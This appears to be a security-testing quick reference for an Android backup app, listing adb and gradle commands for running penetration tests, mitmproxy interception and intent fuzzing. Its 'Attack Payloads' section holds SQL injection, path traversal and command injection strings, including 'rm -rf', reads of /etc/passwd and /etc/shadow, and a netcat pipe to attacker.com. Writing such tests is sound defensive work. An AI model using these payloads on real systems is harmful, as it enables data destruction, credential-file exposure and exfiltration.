# Security Testing Quick Reference

## Overview

This document provides quick commands and references for running security penetration tests on ObsidianBackup.

---

## Test Files Created

1. **SecurityPenetrationTests.kt** (26 tests)
   - Intent Injection: 7 tests
   - Path Traversal: 5 tests  
   - Privilege Escalation: 4 tests
   - Data Exposure: 5 tests
   - ContentProvider Security: 5 tests

2. **SecurityRemediationTests.kt** (13 tests)
   - Input validation verification
   - Security configuration checks
   - Edge case handling

**Total**: 39 security tests

---

## Quick Start

### 1. Setup Test Environment

```bash
# Start emulator or connect device
adb devices

# Build and install app
./gradlew installFreeDebug

# Build and install test APK
./gradlew assembleFreeDebugAndroidTest
adb install -r app/build/outputs/apk/androidTest/free/debug/app-free-debug-androidTest.apk
```

### 2. Run All Security Tests

```bash
# Run all security penetration tests
adb shell am instrument -w \
  -e package com.obsidianbackup.security \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner
```

### 3. Run Specific Test Class

```bash
# Run SecurityPenetrationTests only
adb shell am instrument -w \
  -e class com.obsidianbackup.security.SecurityPenetrationTests \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner

# Run SecurityRemediationTests only
adb shell am instrument -w \
  -e class com.obsidianbackup.security.SecurityRemediationTests \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner
```

---

## Test Categories

### Intent Injection Tests

```bash
# All intent injection tests
adb shell am instrument -w \
  -e class com.obsidianbackup.security.SecurityPenetrationTests \
  -e filter "testIntentInjection*" \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner
```

**Individual Tests**:
```bash
# Malicious Tasker intent
adb shell am instrument -w \
  -e class com.obsidianbackup.security.SecurityPenetrationTests#testIntentInjection_maliciousTaskerIntent_shouldBeBlocked \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner

# SQL injection
adb shell am instrument -w \
  -e class com.obsidianbackup.security.SecurityPenetrationTests#testIntentInjection_sqlInjectionInPackageName_shouldBeBlocked \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner

# Command injection
adb shell am instrument -w \
  -e class com.obsidianbackup.security.SecurityPenetrationTests#testIntentInjection_commandInjectionInDescription_shouldBeSanitized \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner

# Deep link injection
adb shell am instrument -w \
  -e class com.obsidianbackup.security.SecurityPenetrationTests#testIntentInjection_deepLinkWithMaliciousUri_shouldBeBlocked \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner
```

---

### Path Traversal Tests

```bash
# All path traversal tests
adb shell am instrument -w \
  -e class com.obsidianbackup.security.SecurityPenetrationTests \
  -e filter "testPathTraversal*" \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner
```

**Individual Tests**:
```bash
# Dot-dot-slash sequences
adb shell am instrument -w \
  -e class com.obsidianbackup.security.SecurityPenetrationTests#testPathTraversal_dotDotSlashInAppId_shouldBeBlocked \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner

# Absolute paths
adb shell am instrument -w \
  -e class com.obsidianbackup.security.SecurityPenetrationTests#testPathTraversal_absolutePathInAppId_shouldBeBlocked \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner

# Symbolic links
adb shell am instrument -w \
  -e class com.obsidianbackup.security.SecurityPenetrationTests#testPathTraversal_symbolicLinkAttack_shouldBeBlocked \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner

# Null byte injection
adb shell am instrument -w \
  -e class com.obsidianbackup.security.SecurityPenetrationTests#testPathTraversal_nullByteInjection_shouldBeBlocked \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner
```

---

### Data Exposure Tests

```bash
# All data exposure tests
adb shell am instrument -w \
  -e class com.obsidianbackup.security.SecurityPenetrationTests \
  -e filter "testDataExposure*" \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner
```

**Individual Tests**:
```bash
# Logs don't contain sensitive data
adb shell am instrument -w \
  -e class com.obsidianbackup.security.SecurityPenetrationTests#testDataExposure_logsDoNotContainSensitiveData_shouldPass \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner

# Backup files encrypted
adb shell am instrument -w \
  -e class com.obsidianbackup.security.SecurityPenetrationTests#testDataExposure_backupFilesAreEncrypted_shouldPass \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner

# Database encrypted
adb shell am instrument -w \
  -e class com.obsidianbackup.security.SecurityPenetrationTests#testDataExposure_databaseIsEncrypted_shouldPass \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner
```

---

### ContentProvider Security Tests

```bash
# All ContentProvider tests
adb shell am instrument -w \
  -e class com.obsidianbackup.security.SecurityPenetrationTests \
  -e filter "testContentProvider*" \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner
```

**Individual Tests**:
```bash
# Unauthorized query
adb shell am instrument -w \
  -e class com.obsidianbackup.security.SecurityPenetrationTests#testContentProvider_unauthorizedQuery_shouldBeBlocked \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner

# SQL injection in URI
adb shell am instrument -w \
  -e class com.obsidianbackup.security.SecurityPenetrationTests#testContentProvider_sqlInjectionInUri_shouldBeBlocked \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner

# Path traversal in URI
adb shell am instrument -w \
  -e class com.obsidianbackup.security.SecurityPenetrationTests#testContentProvider_pathTraversalInUri_shouldBeBlocked \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner
```

---

## Using Gradle

### Run via Gradle
```bash
# Run all androidTest tests
./gradlew connectedFreeDebugAndroidTest

# Run specific test class
./gradlew connectedFreeDebugAndroidTest \
  -Pandroid.testInstrumentationRunnerArguments.class=com.obsidianbackup.security.SecurityPenetrationTests

# Run with coverage
./gradlew createFreeDebugCoverageReport
```

### Generate Reports
```bash
# Generate HTML test report
./gradlew connectedFreeDebugAndroidTest

# View report
open app/build/reports/androidTests/connected/free/debug/index.html
```

---

## Manual Testing Scenarios

### 1. Network Traffic Interception

#### Setup mitmproxy
```bash
# Install mitmproxy
brew install mitmproxy  # macOS
# or
pip install mitmproxy

# Start proxy
mitmproxy --port 8080
```

#### Configure Device
```bash
# Set proxy on device
adb shell settings put global http_proxy <host>:8080

# Install mitmproxy certificate
adb push ~/.mitmproxy/mitmproxy-ca-cert.cer /sdcard/
# Then: Settings > Security > Install from storage

# Trigger network traffic
# Try cloud sync operations
# Verify HTTPS only (certificate pinning should block proxy)

# Remove proxy
adb shell settings put global http_proxy :0
```

---

### 2. Root Detection Testing

#### On Rooted Device
```bash
# Install app
adb install app-free-debug.apk

# Test root detection
# 1. Open app - should detect root
# 2. Enable MagiskHide
# 3. Relaunch app - should still detect (SafetyNet)
# 4. Check logs
adb logcat -s RootDetection
```

---

### 3. Intent Fuzzing

#### Using ADB
```bash
# Send malicious Tasker intent
adb shell am broadcast \
  -a com.obsidianbackup.tasker.ACTION_START_BACKUP \
  --es calling_package "com.malicious.app" \
  --esa package_list "com.victim.app"

# Check logs for rejection
adb logcat -s TaskerIntegration

# Try SQL injection
adb shell am broadcast \
  -a com.obsidianbackup.tasker.ACTION_START_BACKUP \
  --es calling_package "net.dinglisch.android.taskerm" \
  --esa package_list "'; DROP TABLE backups; --"
```

---

### 4. Deep Link Testing

```bash
# Valid deep link
adb shell am start -a android.intent.action.VIEW \
  -d "obsidianbackup://backup?profile_id=test"

# Malicious deep link (path traversal)
adb shell am start -a android.intent.action.VIEW \
  -d "obsidianbackup://restore?path=../../etc/passwd"

# Check logs
adb logcat -s DeepLinkSecurityValidator
```

---

## Attack Payloads for Manual Testing

### SQL Injection Payloads
```sql
'; DROP TABLE backups; --
' OR '1'='1
" OR "1"="1
'; DELETE FROM snapshots WHERE 1=1; --
' UNION SELECT * FROM users--
admin'--
```

### Path Traversal Payloads
```
../../../etc/passwd
../../system
....//....//etc/shadow
%2e%2e%2f%2e%2e%2fsystem
/data/data/other.app
/system/bin/su
```

### Command Injection Payloads
```bash
; rm -rf /data/data/com.obsidianbackup
&& cat /etc/passwd
| nc attacker.com 1234
`whoami`
$(id)
```

---

## Continuous Integration

### GitHub Actions Example
```yaml
name: Security Tests

on: [push, pull_request]

jobs:
  security-tests:
    runs-on: macos-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Set up JDK
        uses: actions/setup-java@v3
        with:
          distribution: 'temurin'
          java-version: '17'
      
      - name: Run security tests
        uses: reactivecircus/android-emulator-runner@v2
        with:
          api-level: 33
          script: ./gradlew connectedFreeDebugAndroidTest \
            -Pandroid.testInstrumentationRunnerArguments.class=com.obsidianbackup.security.SecurityPenetrationTests
      
      - name: Upload test results
        if: always()
        uses: actions/upload-artifact@v3
        with:
          name: security-test-results
          path: app/build/reports/androidTests/
```

---

## Troubleshooting

### Tests Won't Run
```bash
# Check connected devices
adb devices

# Verify test APK installed
adb shell pm list packages | grep obsidianbackup

# Check test runner
adb shell pm list instrumentation

# Clear app data
adb shell pm clear com.obsidianbackup.free.debug
```

### Tests Fail Unexpectedly
```bash
# Increase ADB timeout
adb shell settings put global adb_debug_timeout 60000

# Check logs
adb logcat -v time > test_logs.txt

# Run single test for debugging
adb shell am instrument -w \
  -e debug true \
  -e class com.obsidianbackup.security.SecurityPenetrationTests#testIntentInjection_maliciousTaskerIntent_shouldBeBlocked \
  com.obsidianbackup.free.debug.test/androidx.test.runner.AndroidJUnitRunner
```

### Hilt Injection Fails
```bash
# Verify Hilt is configured
./gradlew :app:kaptFreeDebugAndroidTestKotlin

# Check generated code
ls -la app/build/generated/source/kapt/freeDebugAndroidTest/

# Clean and rebuild
./gradlew clean
./gradlew assembleFreeDebugAndroidTest
```

---

## Pass/Fail Criteria

### ✅ PASS: All attacks blocked
- All 39 tests pass
- No security exceptions in logs
- No backup operations triggered by malicious intents
- Path traversal attempts rejected
- Data encryption verified

### ❌ FAIL: Security breach detected
- Any test fails
- Unauthorized backup triggered
- Path traversal succeeds
- Sensitive data exposed in logs/files
- SQL injection successful

---

## Next Steps

1. **Run all tests**: `./gradlew connectedFreeDebugAndroidTest`
2. **Review failures**: Check `app/build/reports/androidTests/`
3. **Fix vulnerabilities**: Implement remediations from report
4. **Re-test**: Verify fixes resolve issues
5. **Document**: Update security documentation

---

## Contact

**Security Team**: security@obsidianbackup.com  
**Bug Bounty**: Responsible disclosure appreciated  
**Documentation**: See `SECURITY_PENETRATION_TEST_REPORT.md`

---

**Last Updated**: 2024-02-08  
**Test Suite Version**: 1.0  
**Total Tests**: 39
